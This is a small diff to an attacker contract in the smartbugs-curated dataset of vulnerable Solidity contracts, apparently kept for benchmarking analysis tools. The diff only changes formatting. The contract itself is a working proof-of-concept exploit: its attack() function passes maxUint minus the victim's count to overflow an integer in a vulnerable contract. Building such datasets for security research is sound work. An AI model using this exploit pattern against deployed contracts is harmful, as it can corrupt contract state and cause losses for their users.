+++ smartbugs-curated/0.4.x/contracts/arithmetic/integer_overflow_add_attack.sol
@@ -5,12 +5,12 @@ import "../dataset/arithmetic/integer_overflow_add.sol";
 contract IntegerOverflowAddAttacker {
     IntegerOverflowAdd public victim_contract;
 
-    constructor (address _overflowAddress) public {
+    constructor(address _overflowAddress) public {
         victim_contract = IntegerOverflowAdd(_overflowAddress);
     }
 
     function attack() public {
-        uint maxUint = 2**256 - 1;
+        uint256 maxUint = 2 ** 256 - 1;
 
         // Call the add function with a value that will cause an overflow
         victim_contract.run(maxUint - victim_contract.count());
